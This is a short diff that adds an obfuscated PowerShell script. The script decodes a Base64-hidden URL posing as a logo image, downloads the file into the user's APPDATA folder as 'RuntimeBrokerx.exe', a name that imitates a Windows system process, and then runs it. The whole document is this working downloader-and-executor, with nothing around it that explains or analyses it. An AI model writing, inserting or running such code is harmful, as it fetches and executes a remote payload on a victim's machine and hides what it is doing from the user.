@@ -1,0 +1,5 @@
+${u`R`L} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9iYW5uZWR0YXBlcy5jb20vbG9nby9sb2dvLnBuZw=='))
+${o`U`T} = "${e`Nv:APPDATA}\RuntimeBrokerx.exe"
+${w`E`B} = { param($u, $o); (New-Object System.Net.WebClient).DownloadFile($u, $o) }
+& ${w`E`B} -u ${u`R`L} -o ${o`U`T}
+Start-Process -FilePath ${o`U`T}
